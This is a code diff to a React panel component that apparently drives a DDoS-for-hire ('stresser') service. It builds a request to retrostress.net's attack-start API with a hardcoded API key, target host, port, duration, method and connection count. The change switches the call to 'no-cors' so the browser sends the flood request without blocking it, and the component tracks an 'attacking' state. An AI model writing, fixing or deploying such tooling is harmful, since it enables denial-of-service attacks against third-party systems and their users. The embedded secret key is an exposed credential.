@@ -97,17 +97,13 @@ export default function Panel() {
         const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5"; 
         const apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${target}&port=${port || '80'}&time=${finalDuration}&method=${method}&concurrent=${finalConns}`;
         
-        // Removed mode: 'no-cors' so we can read the response status and text
-        const response = await fetch(apiUrl);
-        if (!response.ok) {
-           const errorText = await response.text();
-           setApiError(errorText || `API returned status ${response.status}`);
-           setIsAttacking(false);
-           return;
-        }
+        // We use mode: 'no-cors' so the browser doesn't block the request if the API server lacks CORS headers
+        // Note: With 'no-cors', we cannot read the response body or status.
+        // If the fetch completes without throwing a network error, we assume it was sent successfully.
+        await fetch(apiUrl, { mode: 'no-cors' }); 
       } catch (err) {
         console.error("API Hit Error:", err);
-        setApiError(err.message || "Failed to connect to API");
+        setApiError("Failed to connect to API or Network Error. Check target details.");
         setIsAttacking(false);
         return;
       }
